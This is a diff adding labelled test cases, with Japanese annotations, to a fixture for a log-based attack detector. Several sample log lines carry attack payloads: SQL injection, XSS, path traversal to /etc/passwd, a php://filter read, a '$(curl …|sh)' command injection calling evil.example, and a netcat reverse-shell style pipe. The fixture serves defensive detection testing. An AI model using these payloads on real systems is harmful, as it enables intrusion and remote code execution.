@@ -346,6 +346,126 @@
    "expected": "not_vulnerable",
    "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.html HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
    "note": "通常のページ取得は何にも該当しない"
+  },
+  {
+   "case_id": "lfi-double-encoded:LFI_RFI",
+   "rule_id": "LFI_RFI",
+   "location": "lfi-double-encoded",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /download?file=%252e%252e%252fetc%252fpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "二重エンコードの../はLFI_RFIにも該当する(素の../の行と同じ扱いに揃えるラベル修正。検出器の結果を見た後に行った)"
+  },
+  {
+   "case_id": "heldout-sqli-union-all:SQL_INJECTION",
+   "rule_id": "SQL_INJECTION",
+   "location": "heldout-sqli-union-all",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?id=1+UNION+ALL+SELECT+NULL,NULL HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: UNION ALL SELECT(攻撃)"
+  },
+  {
+   "case_id": "heldout-sqli-benign-union-word:SQL_INJECTION",
+   "rule_id": "SQL_INJECTION",
+   "location": "heldout-sqli-benign-union-word",
+   "expected": "not_vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /careers?team=union&role=select-staff HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: 通常のクエリ"
+  },
+  {
+   "case_id": "heldout-xss-img-onerror:XSS",
+   "rule_id": "XSS",
+   "location": "heldout-xss-img-onerror",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /s?q=<img src=x onerror=alert(1)> HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: imgのonerror"
+  },
+  {
+   "case_id": "heldout-xss-benign-js-path:XSS",
+   "rule_id": "XSS",
+   "location": "heldout-xss-benign-js-path",
+   "expected": "not_vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /static/javascript/main.js HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: パスにjavascriptを含むだけ"
+  },
+  {
+   "case_id": "heldout-cmd-subshell-curl:CMD_INJECTION",
+   "rule_id": "CMD_INJECTION",
+   "location": "heldout-cmd-subshell-curl",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?c=$(curl http://evil.example/x|sh) HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: $(curl ...)"
+  },
+  {
+   "case_id": "heldout-cmd-pipe-nc:CMD_INJECTION",
+   "rule_id": "CMD_INJECTION",
+   "location": "heldout-cmd-pipe-nc",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /x?host=1.1.1.1|nc 203.0.113.9 4444 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: パイプでnc(リバースシェル風)"
+  },
+  {
+   "case_id": "heldout-bf-sshd-failed-password:BRUTE_FORCE",
+   "rule_id": "BRUTE_FORCE",
+   "location": "heldout-bf-sshd-failed-password",
+   "expected": "vulnerable",
+   "line": "sshd[771]: Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2",
+   "note": "調整後に追加: 実際のsshdのログイン失敗"
+  },
+  {
+   "case_id": "heldout-ssrf-ipv6-loopback:SSRF",
+   "rule_id": "SSRF",
+   "location": "heldout-ssrf-ipv6-loopback",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=http://[::1]:8080/admin HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: IPv6ループバック宛"
+  },
+  {
+   "case_id": "heldout-ssrf-benign-https-public:SSRF",
+   "rule_id": "SSRF",
+   "location": "heldout-ssrf-benign-https-public",
+   "expected": "not_vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /fetch?url=https://example.com/feed.xml HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: 公開サイト"
+  },
+  {
+   "case_id": "heldout-scanner-nikto-ua:SCANNER",
+   "rule_id": "SCANNER",
+   "location": "heldout-scanner-nikto-ua",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET / HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\"",
+   "note": "調整後に追加: NiktoのUA"
+  },
+  {
+   "case_id": "heldout-scanner-benign-curl:SCANNER",
+   "rule_id": "SCANNER",
+   "location": "heldout-scanner-benign-curl",
+   "expected": "not_vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /healthz HTTP/1.1\" 200 512 \"-\" \"curl/8.5.0\"",
+   "note": "調整後に追加: curlによる通常のヘルスチェック"
+  },
+  {
+   "case_id": "heldout-sensitive-htpasswd:SENSITIVE_FILE_PROBE",
+   "rule_id": "SENSITIVE_FILE_PROBE",
+   "location": "heldout-sensitive-htpasswd",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /admin/.htpasswd HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: .htpasswd探索"
+  },
+  {
+   "case_id": "heldout-lfi-php-filter:LFI_RFI",
+   "rule_id": "LFI_RFI",
+   "location": "heldout-lfi-php-filter",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"GET /index.php?page=php://filter/convert.base64-encode/resource=config HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: php://filter"
+  },
+  {
+   "case_id": "heldout-cms-xmlrpc:CMS_PROBE",
+   "rule_id": "CMS_PROBE",
+   "location": "heldout-cms-xmlrpc",
+   "expected": "vulnerable",
+   "line": "203.0.113.7 - - [22/Oct/2026:10:00:00 +0900] \"POST /xmlrpc.php HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0\"",
+   "note": "調整後に追加: xmlrpc.php"
   }
  ]
 }
